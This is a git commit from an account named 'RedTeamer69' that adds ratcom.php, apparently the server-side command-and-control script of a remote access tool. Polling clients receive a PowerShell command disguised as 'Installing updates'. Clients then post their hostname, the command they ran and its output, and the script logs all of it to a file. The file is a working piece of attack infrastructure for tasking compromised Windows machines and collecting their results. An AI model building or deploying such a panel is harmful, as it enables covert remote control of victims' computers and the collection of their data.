39992bbc9697f5a6d769fcd7dd1fb0f372401015
RedTeamer69 <116715988+RedTeamer69@users.noreply.github.com>
2022-11-18 13:22:54 +0100

    Add files via upload

---
+++ ratcom.php
@@ -0,0 +1,24 @@
+<?php
+
+if(isset($_GET['hostname']))
+{
+    // send a command
+   echo "Write-Host 'Installing updates'";
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+  $cac1 = htmlspecialchars($_POST["cmd"]);
+  $cac2 = htmlspecialchars($_POST["displ"]);
+  $cac3 = htmlspecialchars($_POST["hostname"]);
+
+  $stamp = date('Ymd_His');
+
+  $hn = fopen("tmp/access.log", "a+");
+  $r = fwrite($hn, "New client request: " . $stamp . "\n");
+  $r = fwrite($hn, "Hostname: " . $cac3 . "\n");
+  $r = fwrite($hn, "Command: " . $cac1 . "\n");
+  $r = fwrite($hn, "Response: " . $cac2 . "\n");
+  $r = fwrite($hn, "Client request end: " . $stamp. "\n\n");
+  fclose($hn);
+}
+?>
